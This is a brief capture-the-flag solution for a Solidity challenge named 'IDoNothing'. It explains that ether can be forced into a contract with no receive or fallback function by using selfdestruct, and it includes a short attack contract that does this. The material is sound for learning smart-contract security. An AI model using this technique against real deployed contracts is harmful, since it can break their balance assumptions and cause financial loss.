# IDoNothing

## Solution :

To validate this challenge, the user needs to send ethers to the contract.

To send ethers, he can't use the send/ transfer/ call methods because there is no fallback/ receive function in the contract.
So he needs to use the destruct method to force send ether.

He needs to create an attack contract, send ether to this contract and after call the selfdestruct method with the address of the challenge's contract in params.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/intermediateChalls/IDoNothing.sol";

contract AttackIDoNothing {
    address payable originalContract;

    constructor(address payable _originalContract) public {
        originalContract = _originalContract;
    }

    function exploit() public payable {
        require(msg.value > 0 ether);
        selfdestruct(originalContract);
    }
}
```